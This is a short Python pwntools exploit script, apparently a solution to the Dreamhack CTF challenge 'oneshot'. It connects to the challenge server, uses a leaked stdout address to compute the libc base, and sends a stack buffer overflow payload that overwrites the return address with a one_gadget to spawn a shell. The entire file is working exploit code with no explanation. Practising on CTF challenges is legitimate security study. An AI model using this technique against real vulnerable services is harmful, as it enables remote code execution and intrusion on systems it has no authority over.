from pwn import *

p = remote('host3.dreamhack.games', 11384)
libc = ELF('./libc-2.23.so')
e = ELF('./oneshot')

og = [0xf1247, 0xf03a4, 0x45226]

p.recvuntil(b'stdout: ')
stdout = int(p.recvline()[:-1], 16)
lb = stdout - libc.symbols['_IO_2_1_stdout_']
onegadget = lb + og[2]

msg = b'A' * 0x18
msg += p64(0) + b'B' * 8
msg += p64(onegadget)

p.sendafter(b'MSG: ', msg)
p.interactive()